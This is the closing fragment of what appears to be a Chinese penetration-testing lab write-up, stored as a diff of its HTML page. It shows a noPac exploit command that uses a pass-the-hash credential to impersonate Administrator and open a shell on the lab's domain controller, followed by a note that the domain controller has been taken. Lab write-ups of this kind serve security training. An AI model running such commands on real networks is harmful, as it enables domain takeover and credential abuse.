+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">p4 python3 noPac.py xiaorang.lab/zhanghui -hashes &#39;:1232126b24cdf8c9bd2f788a9d7c7ed1&#39; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418110052.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240418110052.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>拿到域控结束</p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/privilege" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">privilege</p>
+            </a>
+            
+
+            
+            <a href="/post/exchange" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">Exchange</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
